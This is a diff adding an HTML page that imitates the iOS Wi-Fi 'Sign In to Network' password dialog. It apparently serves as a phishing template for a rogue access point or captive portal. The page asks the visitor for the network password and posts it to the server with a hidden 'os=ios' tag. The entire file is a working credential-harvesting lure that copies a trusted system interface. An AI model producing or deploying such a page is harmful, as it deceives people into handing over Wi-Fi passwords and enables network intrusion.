@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sign In to Network</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: -apple-system, 'SF Pro Text', 'Helvetica Neue', Arial, sans-serif;
+    background: #f2f2f7;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+  }
+  .card {
+    background: #fff;
+    border-radius: 16px;
+    width: 100%;
+    max-width: 340px;
+    overflow: hidden;
+    box-shadow: 0 4px 24px rgba(0,0,0,0.12);
+  }
+  .header {
+    padding: 28px 24px 20px;
+    text-align: center;
+    border-bottom: 1px solid #e5e5ea;
+  }
+  .wifi-icon {
+    width: 56px;
+    height: 56px;
+    margin: 0 auto 12px;
+  }
+  .title {
+    font-size: 17px;
+    font-weight: 600;
+    color: #1c1c1e;
+    margin-bottom: 6px;
+  }
+  .subtitle {
+    font-size: 13px;
+    color: #8e8e93;
+    line-height: 1.4;
+  }
+  .form-section { padding: 0 16px 16px; }
+  .field-group {
+    background: #f2f2f7;
+    border-radius: 10px;
+    margin-top: 16px;
+    overflow: hidden;
+  }
+  .field {
+    display: flex;
+    align-items: center;
+    padding: 11px 14px;
+    background: #fff;
+    border: 1px solid #e5e5ea;
+    border-radius: 10px;
+    margin-top: 8px;
+  }
+  .field label {
+    font-size: 15px;
+    color: #1c1c1e;
+    min-width: 80px;
+  }
+  .field input {
+    flex: 1;
+    border: none;
+    outline: none;
+    font-size: 15px;
+    color: #1c1c1e;
+    background: transparent;
+    font-family: inherit;
+  }
+  .field input::placeholder { color: #c7c7cc; }
+  .btn-join {
+    width: 100%;
+    margin-top: 16px;
+    padding: 14px;
+    background: #007aff;
+    color: #fff;
+    border: none;
+    border-radius: 10px;
+    font-size: 17px;
+    font-weight: 500;
+    font-family: inherit;
+    cursor: pointer;
+    letter-spacing: -0.2px;
+  }
+  .btn-join:active { background: #0062cc; }
+  .btn-cancel {
+    width: 100%;
+    margin-top: 8px;
+    padding: 14px;
+    background: transparent;
+    color: #007aff;
+    border: none;
+    font-size: 17px;
+    font-family: inherit;
+    cursor: pointer;
+  }
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="header">
+    <svg class="wifi-icon" viewBox="0 0 56 56" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <circle cx="28" cy="28" r="28" fill="#f2f2f7"/>
+      <path d="M28 36a3 3 0 1 0 0 6 3 3 0 0 0 0-6z" fill="#007aff"/>
+      <path d="M20.5 31.5a10.5 10.5 0 0 1 15 0" stroke="#007aff" stroke-width="2.5" stroke-linecap="round"/>
+      <path d="M14 25a19 19 0 0 1 28 0" stroke="#007aff" stroke-width="2.5" stroke-linecap="round"/>
+      <path d="M8 18.5a27 27 0 0 1 40 0" stroke="#007aff" stroke-width="2.5" stroke-linecap="round"/>
+    </svg>
+    <div class="title">Sign In to Network</div>
+    <div class="subtitle">Enter the password for the Wi-Fi network to continue.</div>
+  </div>
+  <div class="form-section">
+    <form method="POST" action="/">
+      <input type="hidden" name="os" value="ios">
+      <div class="field">
+        <label>Password</label>
+        <input type="password" name="password" placeholder="Required" autocomplete="current-password" autofocus>
+      </div>
+      <button type="submit" class="btn-join">Join</button>
+      <button type="button" class="btn-cancel" onclick="window.history.back()">Cancel</button>
+    </form>
+  </div>
+</div>
+</body>
+</html>
